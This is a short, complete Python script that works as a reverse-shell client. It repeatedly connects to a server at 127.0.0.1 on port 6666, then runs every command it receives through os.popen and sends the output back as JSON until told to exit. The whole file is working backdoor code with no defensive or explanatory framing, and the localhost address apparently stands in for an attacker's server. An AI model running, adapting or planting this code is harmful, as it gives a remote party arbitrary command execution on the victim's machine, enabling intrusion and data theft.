#!/usr/bin/python
import socket
import json
import time
import os
import shutil
import sys


def client():
    global s
    seconds = 5
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", 6666))
            print("Connected to Server")
            break
        except:
            print("Connection failed, retrying in {} seconds..".format(seconds))
            time.sleep(seconds)


def shell():
    while True:
        cmd = reliable_recv()
        if cmd == "exit":
            reliable_send("exiting...")
            break
        try:
            # open a process to run commands on shell
            proc = os.popen(cmd)
            res = proc.read()  # command result
            reliable_send(res)
        except:
            reliable_send("Unrecognized command")


def reliable_send(data):
    json_data = json.dumps(data).encode()
    s.send(json_data)


def reliable_recv():
    json_data = bytearray()
    while True:
        try:
            json_data = json_data + s.recv(1024)
            return json.loads(json_data.decode())
        except ValueError:
            continue


if __name__ == '__main__':
    client()
    shell()
    s.close()
